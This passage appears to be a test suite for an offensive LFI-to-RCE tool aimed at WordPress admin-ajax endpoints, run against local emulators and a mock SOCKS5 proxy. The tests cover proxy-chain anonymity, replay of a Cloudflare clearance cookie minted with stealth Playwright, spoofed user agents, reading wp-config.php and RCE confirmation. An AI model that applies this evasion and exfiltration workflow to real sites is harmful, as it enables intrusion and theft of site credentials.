        const up = net.connect({ host: '127.0.0.1', port }, () => {
          sock.write(Buffer.from([0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0]));
          sock.pipe(up); up.pipe(sock);
        });
        up.on('error', () => sock.destroy());
        stage = 2;
      }
    });
  });
}

// The include emulator as a real loopback http origin, recording the identity
// headers of every hit (ua/cookie) alongside the posted body it evaluates.
function originFrom(emu, state) {
  return http.createServer((req, res) => {
    let body = '';
    req.on('data', (d) => { body += d; });
    req.on('end', async () => {
      state.hits.push({ url: req.url, ua: req.headers['user-agent'] || '', cookie: req.headers.cookie || '', body });
      const r = await emu({ body });
      res.writeHead(r.status || 200, r.headers || {});
      res.end(r.body || '');
    });
  });
}

function tmpVault() {
  return join(os.tmpdir(), 'lfichain-vault-' + process.pid + '-' + Math.random().toString(36).slice(2) + '.json');
}

// A vault holding ONE entry for zone under egressId (the mint-side keying).
// expired: true backdates the TTL so readVault prunes it on read.
function vaultWith(zone, egressId, cookieValue, { expired = false } = {}) {
  const vaultPath = tmpVault();
  const now = Date.now();
  const mintedAt = new Date(now - 60000).toISOString();
  const expiresAt = new Date(now + (expired ? -1000 : 45 * 60000)).toISOString();
  const entries = {};
  entries[vaultKey(zone, egressId, RIDE_UA)] = {
    cookies: [{ name: 'cf_clearance', value: cookieValue, domain: zone.split(':')[0], path: '/' }],
    ua: RIDE_UA, mintedAt, expiresAt,
    engine: 'patchright (stealth Playwright + real Chrome)',
  };
  assert.equal(writeVault(entries, { vaultPath }).ok, true);
  return { vaultPath, mintedAt, expiresAt };
}

test('vault ride: chain-keyed entry -- probe rides the chain, vault cookie + exact UA on every request', async (t) => {
  const socksState = { connects: [] };
  const originState = { hits: [] };
  const socks = mockSocks5(socksState);
  const origin = originFrom(includeEmulator(FS_OPEN), originState);
  const pport = await listen(socks);
  const oport = await listen(origin);
  t.after(async () => { await closeServer(origin); await closeServer(socks); });

  const chain = 'socks5://127.0.0.1:' + pport;
  const egressId = chainEgressId(chain);
  const ghost = new Ghost();
  ghost.configure({ mode: 'on', chain });
  const url = 'http://' + PUBLIC_HOST + ':' + oport + '/wp-admin/admin-ajax.php';
  const v = vaultWith(PUBLIC_HOST + ':' + oport, egressId, 'chain-minted');

  const r = await probeLfi(url, {
    scope: '93.184.216.0/24', resolve: async () => ['93.184.216.34'],
    ghost, vaultPath: v.vaultPath, paceMs: 0, audit: false,
  });
  assert.equal(r.ok, true, r.reason);
  assert.equal(r.capability.traversal, true, 'the emulator answers through the ride');
  assert.equal(r.requests, 5);
  assert.equal(r.ride.egressId, egressId);
  assert.match(r.ride.transport, /ghost chain \(1 hop/);
  assert.equal(r.ride.mintedAt, v.mintedAt);
  assert.equal(r.ride.expiresAt, v.expiresAt);
  assert.equal(r.transport, r.ride.transport, 'the top-level transport names the ride');
  // egress parity: the proxy was dialed carrying the PUBLIC NAME (remote DNS)
  assert.ok(socksState.connects.length >= 1);
  for (const cn of socksState.connects) assert.deepEqual(cn, { host: PUBLIC_HOST, port: oport });
  // and the origin saw the vault's EXACT identity on every probe request
  assert.equal(originState.hits.length, 5);
  for (const h of originState.hits) {
    assert.equal(h.ua, RIDE_UA, 'the vault UA survives the scrub verbatim');
    assert.equal(h.cookie, 'cf_clearance=chain-minted', 'the vault cookie rides every request');
  }
  assert.ok(!JSON.stringify(r).includes('chain-minted'), 'the live credential never reaches the report');
});

test('vault ride: --no-ride forces cookieless even with a valid entry on file', async (t) => {
  const socksState = { connects: [] };
  const originState = { hits: [] };
  const socks = mockSocks5(socksState);
  const origin = originFrom(includeEmulator(FS_OPEN), originState);
  const pport = await listen(socks);
  const oport = await listen(origin);
  t.after(async () => { await closeServer(origin); await closeServer(socks); });

  const chain = 'socks5://127.0.0.1:' + pport;
  const ghost = new Ghost();
  ghost.configure({ mode: 'on', chain });
  const url = 'http://' + PUBLIC_HOST + ':' + oport + '/wp-admin/admin-ajax.php';
  const v = vaultWith(PUBLIC_HOST + ':' + oport, chainEgressId(chain), 'chain-minted');

  const r = await probeLfi(url, {
    scope: '93.184.216.0/24', resolve: async () => ['93.184.216.34'],
    ghost, vaultPath: v.vaultPath, ride: false, paceMs: 0, audit: false,
  });
  assert.equal(r.ok, true, r.reason);
  assert.equal(r.ride, null, 'no ride is claimed');
  assert.ok(!r.gaps.some((g) => /no valid clearance/.test(g)), 'an explicit --no-ride is not a gap');
  assert.equal(originState.hits.length, 5);
  for (const h of originState.hits) {
    assert.equal(h.cookie, '', 'no cookie on the wire');
    assert.match(h.ua, PERSONA_RE, 'the plain ghost persona UA, not the vault UA');
  }
});

test('vault ride: expired or absent entry -- cookieless with the honest gap, never a silent assumption', async (t) => {
  const originState = { hits: [] };
  const origin = originFrom(includeEmulator(FS_OPEN), originState);
  const oport = await listen(origin);
  t.after(() => closeServer(origin));
  const url = 'http://127.0.0.1:' + oport + '/wp-admin/admin-ajax.php';
  const base = { scope: SCOPE_LOOP, paceMs: 0, audit: false }; // ghost off, private -> direct

  const expired = vaultWith('127.0.0.1:' + oport, 'direct', 'stale-cookie', { expired: true });
  const r1 = await probeLfi(url, { ...base, vaultPath: expired.vaultPath });
  assert.equal(r1.ok, true, r1.reason);
  assert.equal(r1.capability.traversal, true, 'the run still probes, cookieless');
  assert.equal(r1.ride, null);
  assert.ok(r1.gaps.some((g) => /no valid clearance for zone/.test(g) && /mint first/.test(g)), 'the honest gap, got: ' + JSON.stringify(r1.gaps));

  const r2 = await probeLfi(url, { ...base, vaultPath: tmpVault() });
  assert.equal(r2.ok, true, r2.reason);
  assert.equal(r2.ride, null);
  assert.ok(r2.gaps.some((g) => /no valid clearance for zone/.test(g) && /mint first/.test(g)));

  assert.equal(originState.hits.length, 10, 'both runs sent their full probe set');
  for (const h of originState.hits) {
    assert.equal(h.cookie, '', 'cookieless without a valid entry');
    assert.match(h.ua, PERSONA_RE);
  }
});

test('vault ride egress parity: direct-keyed entry + armed ghost rides DIRECT per doctrine (read mode), never the chain', async (t) => {
  const socksState = { connects: [] };
  const originState = { hits: [] };
  const socks = mockSocks5(socksState);
  const origin = originFrom(includeEmulator(FS_OPEN), originState);
  const pport = await listen(socks);
  const oport = await listen(origin);
  t.after(async () => { await closeServer(origin); await closeServer(socks); });

  const ghost = new Ghost();
  ghost.configure({ mode: 'on', chain: 'socks5://127.0.0.1:' + pport });
  const url = 'http://127.0.0.1:' + oport + '/wp-admin/admin-ajax.php';
  const v = vaultWith('127.0.0.1:' + oport, 'direct', 'direct-minted');
  const writes = [];
  const writeEvidence = async (path, buf) => { writes.push({ path, buf }); return { evidenceFile: 'mem://' + path, sha256: sha256hex(buf) }; };

  const r = await lfiRead(url, {
    scope: SCOPE_LOOP, ghost, vaultPath: v.vaultPath, egressId: 'direct',
    paths: ['wp-config.php'], writeEvidence, paceMs: 0, audit: false,
  });
  assert.equal(r.ok, true, r.reason);
  assert.equal(r.results[0].ok, true, 'the read exfiltrates through the ride');
  assert.equal(r.ride.egressId, 'direct');
  assert.match(r.ride.transport, /^direct/);
  assert.equal(socksState.connects.length, 0, 'the chain was NEVER dialed for a direct-bound lab ride');
  assert.equal(originState.hits.length, 1);
  assert.equal(originState.hits[0].ua, RIDE_UA);
  assert.equal(originState.hits[0].cookie, 'cf_clearance=direct-minted');
  assert.ok(!JSON.stringify(r).includes('direct-minted'), 'the live credential never reaches the report');
});

test('vault ride: rce-oracle rides too -- the resource read AND the single confirmation carry the clearance identity', async (t) => {
  const target = padPayload(DEFAULT_PAYLOAD).buf;
  const fs = { 'var/www/html/data.bin': swapPairs(Buffer.from(phpB64Encode(target), 'latin1')).buf };
  const executed = [];
  const socksState = { connects: [] };
  const originState = { hits: [] };
  const socks = mockSocks5(socksState);
  const origin = originFrom(includeEmulator(fs, { executed }), originState);
  const pport = await listen(socks);
  const oport = await listen(origin);
  t.after(async () => { await closeServer(origin); await closeServer(socks); });

  const chain = 'socks5://127.0.0.1:' + pport;
  const egressId = chainEgressId(chain);
  const ghost = new Ghost();
  ghost.configure({ mode: 'on', chain });
  const url = 'http://' + PUBLIC_HOST + ':' + oport + '/wp-admin/admin-ajax.php';
  const v = vaultWith(PUBLIC_HOST + ':' + oport, egressId, 'chain-minted');

  const r = await rceOracle(url, {
    scope: '93.184.216.0/24', resolve: async () => ['93.184.216.34'],
    ghost, vaultPath: v.vaultPath, paceMs: 0, audit: false,
    operatorConfirm: true, resource: '/var/www/html/data.bin',
  });
  assert.equal(r.ok, true, r.reason);
  assert.equal(r.confirmed, true, 'the oracle confirms through the ride (EMULATOR, NOT PHP)');
  assert.equal(r.requests, 2, 'one wrapper read + one oracle confirmation');
  assert.equal(r.ride.egressId, egressId);
  assert.match(r.ride.transport, /ghost chain/);
  assert.equal(originState.hits.length, 2);
  for (const h of originState.hits) {
    assert.equal(h.ua, RIDE_UA, 'the confirmation request carries the vault UA');
    assert.equal(h.cookie, 'cf_clearance=chain-minted', 'the confirmation request carries the vault cookie');
  }
  assert.ok(socksState.connects.length >= 1);
  for (const cn of socksState.connects) assert.deepEqual(cn, { host: PUBLIC_HOST, port: oport });
  assert.equal(executed.length, 1);
  assert.ok(!JSON.stringify(r).includes('chain-minted'), 'the live credential never reaches the report');
});

test('vault ride fail-closed: entry bound to chain A with ghost armed with chain B refuses BEFORE any request', async () => {
  const ghost = new Ghost();
  ghost.configure({ mode: 'on', chain: 'socks5://127.0.0.1:1' }); // chain B (never dialed: the refusal comes first)
  const v = vaultWith('93.184.216.34', 'socks5://10.64.0.1:1080', 'chain-a-minted'); // bound to chain A
  let wire = 0;
  const r = await probeLfi('http://93.184.216.34/wp-admin/admin-ajax.php', {
    scope: '0.0.0.0/0', ghost, vaultPath: v.vaultPath, egressId: 'socks5://10.64.0.1:1080',
    requester: async () => { wire++; return { status: 200, body: '' }; }, audit: false,
  });
  assert.equal(r.ok, false);
  assert.match(r.reason, /different exit IP/);
  assert.match(r.reason, /fail-closed/);
  assert.match(r.reason, /--no-ride/, 'the refusal names the cookieless escape hatch');
  assert.equal(wire, 0, 'not a single request attempted');
});
